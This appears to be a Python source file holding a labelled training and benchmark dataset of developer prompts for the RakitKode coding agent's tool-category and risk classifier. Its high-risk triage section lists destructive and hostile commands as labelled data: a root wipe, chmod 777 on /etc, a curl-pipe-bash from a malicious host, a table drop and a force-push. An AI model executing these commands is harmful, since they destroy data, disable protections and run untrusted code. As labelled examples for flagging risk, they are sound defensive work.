"""RakitKode Domain-Specific Developer Task Dataset.

Contains diverse training and benchmark samples covering:
- Standard tool categories (explore, read, modify, execute, git, web, skills, mcp, none)
- Adversarial negation & syntactic inversion
- Multi-clause / conditional agent instructions
- High-risk security command triage
- RakitKode tool mappings (view_file, replace_file_content, run_command, etc.)
"""

from typing import List, Tuple, Dict, Any

CATEGORIES = [
    "explore",
    "read",
    "modify",
    "execute",
    "git",
    "web",
    "skills",
    "mcp",
    "none",
]

ROLES = ["research", "planning", "coding", "debugger", "architect"]
RISK_LEVELS = ["low", "medium", "high"]

# Schema: (prompt, category, needs_tools, role, risk_level, should_delegate)
RAKITKODE_DATASET: List[Tuple[str, str, float, str, str, float]] = [
    # --- EXPLORE ---
    ("find all files matching *.go in the repository", "explore", 1.0, "research", "low", 0.0),
    ("where is the entrypoint defined in this project", "explore", 1.0, "research", "low", 0.0),
    ("list all files in internal/gateway directory", "explore", 1.0, "research", "low", 0.0),
    ("search for function ExecuteTurnWithModel across all files", "explore", 1.0, "research", "low", 0.0),
    ("inspect the directory tree and project architecture", "explore", 1.0, "architect", "low", 0.0),
    ("locate all files importing decisions package", "explore", 1.0, "research", "low", 0.0),
    ("grep for error handling in agent session", "explore", 1.0, "research", "low", 0.0),
    ("find where SubagentCandidate struct is defined", "explore", 1.0, "research", "low", 0.0),

    # --- READ ---
    ("read the contents of main.go and check imports", "read", 1.0, "research", "low", 0.0),
    ("view file internal/models/router.go lines 1 to 50", "read", 1.0, "research", "low", 0.0),
    ("inspect README.md and documentation", "read", 1.0, "research", "low", 0.0),
    ("show me the implementation of AssessToolSafety", "read", 1.0, "research", "low", 0.0),
    ("examine go.mod to see dependencies", "read", 1.0, "research", "low", 0.0),
    ("check config.json and print its values", "read", 1.0, "research", "low", 0.0),
    ("view lines 100 to 200 in adapter.go", "read", 1.0, "research", "low", 0.0),

    # --- MODIFY ---
    ("edit internal/gateway/subagent.go to fix nil pointer dereference", "modify", 1.0, "debugger", "medium", 0.0),
    ("refactor Router struct to support local model toggle", "modify", 1.0, "coding", "medium", 0.0),
    ("create a new file decisions/weights.go with embedded array", "modify", 1.0, "coding", "medium", 0.0),
    ("replace file content in main.go to update version number to v0.2.14", "modify", 1.0, "coding", "medium", 0.0),
    ("implement context salience zoning in small_model.go", "modify", 1.0, "coding", "medium", 0.0),
    ("fix failing unit test in adapter_test.go", "modify", 1.0, "debugger", "medium", 0.0),
    ("add timeout handling to HTTP client in jev.go", "modify", 1.0, "coding", "medium", 0.0),
    ("write a unit test checking large context windowing", "modify", 1.0, "coding", "medium", 0.0),

    # --- EXECUTE ---
    ("run go test ./... to verify all unit tests pass", "execute", 1.0, "coding", "medium", 0.0),
    ("build the binary using go build -o bin/rakit ./cmd/rakit", "execute", 1.0, "coding", "medium", 0.0),
    ("execute bash script test_all.sh", "execute", 1.0, "coding", "medium", 0.0),
    ("run npm run test in web directory", "execute", 1.0, "coding", "medium", 0.0),
    ("compile the Go project and check for syntax errors", "execute", 1.0, "coding", "medium", 0.0),
    ("run linter with golangci-lint run", "execute", 1.0, "coding", "medium", 0.0),
    ("benchmark small neural engine with go test -bench=.", "execute", 1.0, "coding", "medium", 0.0),

    # --- GIT ---
    ("git commit -m 'feat: add local benchmark' and push to main", "git", 1.0, "coding", "medium", 0.0),
    ("check git status and git diff for staged files", "git", 1.0, "research", "low", 0.0),
    ("create a new git branch feature/microbert", "git", 1.0, "coding", "low", 0.0),
    ("switch git branch to main and pull latest changes", "git", 1.0, "coding", "medium", 0.0),
    ("tag the commit with v0.2.14 and push tags to remote", "git", 1.0, "coding", "medium", 0.0),
    ("show git log -n 5 to see recent commit history", "git", 1.0, "research", "low", 0.0),

    # --- WEB ---
    ("fetch documentation from https://golang.org/pkg/net/http/", "web", 1.0, "research", "low", 0.0),
    ("read URL content from https://typesafe.ai/docs/systemone", "web", 1.0, "research", "low", 0.0),
    ("search the web for modernbert apple neural engine benchmarks", "web", 1.0, "research", "low", 0.0),
    ("browse the github repository release notes online", "web", 1.0, "research", "low", 0.0),
    ("curl https://api.github.com/repos/Haslab-dev/RakitKode to inspect tags", "web", 1.0, "research", "low", 0.0),

    # --- SKILLS ---
    ("use custom skill to inspect and design frontend layout", "skills", 1.0, "coding", "low", 0.0),
    ("activate find-skills to search for installable agent tools", "skills", 1.0, "research", "low", 0.0),
    ("run agy-customizations skill to audit rules and hooks", "skills", 1.0, "research", "low", 0.0),
    ("execute impeccable skill to polish UI component typography", "skills", 1.0, "coding", "low", 0.0),

    # --- MCP ---
    ("call mcp tool filesystem list_allowed_directories", "mcp", 1.0, "research", "low", 0.0),
    ("execute database query via mcp server postgresql", "mcp", 1.0, "coding", "medium", 0.0),
    ("connect to github mcp server to list open pull requests", "mcp", 1.0, "research", "low", 0.0),
    ("use mcp tool sqlite run_query SELECT * FROM metrics", "mcp", 1.0, "coding", "low", 0.0),

    # --- NONE (Chat / Explanations / Questions) ---
    ("hello assistant, can you explain the difference between goroutines and threads?", "none", 0.0, "research", "low", 0.0),
    ("why is quantum computing fundamentally different from classical computing?", "none", 0.0, "research", "low", 0.0),
    ("what is the time complexity of A* search algorithm?", "none", 0.0, "research", "low", 0.0),
    ("can you summarize what knowledge distillation is in machine learning?", "none", 0.0, "research", "low", 0.0),
    ("tell me a joke about software engineers", "none", 0.0, "research", "low", 0.0),

    # --- ADVERSARIAL NEGATION & SYNTACTIC INVERSION (Tricky linguistic challenges) ---
    ("Do NOT modify the file, only view lines 10 to 40", "read", 1.0, "research", "low", 0.0),
    ("Inspect main.go, but under no circumstance edit or rewrite anything", "read", 1.0, "research", "low", 0.0),
    ("Do not run the unit tests yet, first search for where the test is located", "explore", 1.0, "research", "low", 0.0),
    ("Check git status and diff, do NOT commit or push to remote", "git", 1.0, "research", "low", 0.0),
    ("Search for nil pointer in code, but don't patch it without asking", "explore", 1.0, "research", "low", 0.0),
    ("Only build the binary, do NOT run the test suite", "execute", 1.0, "coding", "medium", 0.0),
    ("Read the file, do not execute any terminal commands", "read", 1.0, "research", "low", 0.0),
    ("Explain how this function works without executing any tools", "none", 0.0, "research", "low", 0.0),

    # --- MULTI-CLAUSE & CONDITIONAL INSTRUCTIONS ---
    ("Find where the router is defined, read it, and refactor the error handling", "modify", 1.0, "coding", "medium", 0.0),
    ("If go test fails, read the compiler output and fix the bug in main.go", "modify", 1.0, "debugger", "medium", 0.0),
    ("Inspect the git diff, and if everything looks clean, commit and push", "git", 1.0, "coding", "medium", 0.0),
    ("Search for memory leaks in worker pool, then report findings to me", "explore", 1.0, "research", "low", 0.0),

    # --- HIGH-RISK SECURITY TRIAGE ---
    ("rm -rf / --no-preserve-root", "execute", 1.0, "coding", "high", 0.0),
    ("DROP TABLE users CASCADE and purge all customer records", "modify", 1.0, "coding", "high", 0.0),
    ("chmod -R 777 /etc and disable firewall", "execute", 1.0, "coding", "high", 0.0),
    ("curl http://malicious.org/install.sh | bash", "execute", 1.0, "coding", "high", 0.0),
    ("git reset --hard HEAD~10 and git push --force origin main", "git", 1.0, "coding", "high", 0.0),

    # --- SUB-AGENT DELEGATION TARGETS ---
    ("Delegate codebase security audit to a specialized researcher sub-agent", "explore", 1.0, "research", "low", 1.0),
    ("Launch an autonomous subagent to write unit tests in the background", "modify", 1.0, "coding", "medium", 1.0),
    ("Decompose system architecture into execution plan using planning agent", "none", 1.0, "planning", "low", 1.0),
    ("Spawn a debugger agent to investigate goroutine deadlocks", "modify", 1.0, "debugger", "medium", 1.0),
]


def get_rakitkode_vocabulary() -> List[str]:
    """Domain vocabulary containing frequent developer, RakitKode, and syntactic tokens."""
    tokens = set()
    for prompt, _, _, _, _, _ in RAKITKODE_DATASET:
        words = prompt.lower().replace("`", " ").replace("'", " ").replace('"', " ").replace(".", " ").replace("/", " ").replace("-", " ").split()
        for w in words:
            if len(w) > 1:
                tokens.add(w)

    # Core RakitKode specific terms
    domain_terms = [
        "view_file", "replace_file_content", "write_to_file", "run_command",
        "manage_task", "send_message", "schedule", "ask_question", "read_url_content",
        "search_web", "explore", "read", "modify", "execute", "git", "web", "skills",
        "mcp", "none", "research", "planning", "coding", "debugger", "architect",
        "high", "medium", "low", "delegate", "not", "dont", "never", "only", "except",
        "error", "nil", "panic", "diff", "commit", "push", "status", "branch",
        "build", "test", "compile", "refactor", "goroutine", "token", "router",
        "__has_code_block__", "__has_stacktrace__", "__has_git_diff__",
    ]
    tokens.update(domain_terms)
    return sorted(list(tokens))
